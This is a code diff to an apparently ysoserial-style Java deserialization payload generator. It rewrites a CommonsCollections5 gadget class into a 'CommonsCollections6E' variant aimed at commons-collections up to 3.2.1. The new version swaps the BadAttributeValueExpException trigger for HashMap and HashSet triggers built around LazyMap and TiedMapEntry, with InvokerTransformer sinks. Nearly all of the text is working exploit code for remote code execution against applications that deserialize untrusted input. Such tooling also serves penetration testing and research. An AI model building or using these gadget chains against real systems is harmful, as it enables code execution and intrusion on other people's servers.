@@ -1,8 +1,6 @@
-package com.ppp.chain.collections3;
+package com.ppp.chain.commonscollections3;
 
-import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
-import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
@@ -16,18 +14,18 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.Map;
 
 /**
  * @author Whoopsunix
  */
-@Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
+@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
 @Sink({Sink.InvokerTransformer3})
-public class CommonsCollections5 implements ObjectPayload<Object> {
+public class CommonsCollections6E implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections5.class, args);
+        PayloadRunner.run(CommonsCollections6E.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -47,9 +45,21 @@ public class CommonsCollections5 implements ObjectPayload<Object> {
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
 
-        Object val = KickOff.badAttributeValueExpException(entry);
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+//        // way A
+//        HashMap hashMap = new HashMap();
+//        hashMap.put(entry, "x");
+//        lazyMap.clear();
+//
+//        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+//
+//        return hashMap;
 
-        return val;
+        // way B
+        HashMap hashMap = new HashMap();
+        hashMap.put(entry, "x");
+        HashSet hashSet = new HashSet(hashMap.keySet());
+        lazyMap.clear();
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        return hashSet;
     }
 }
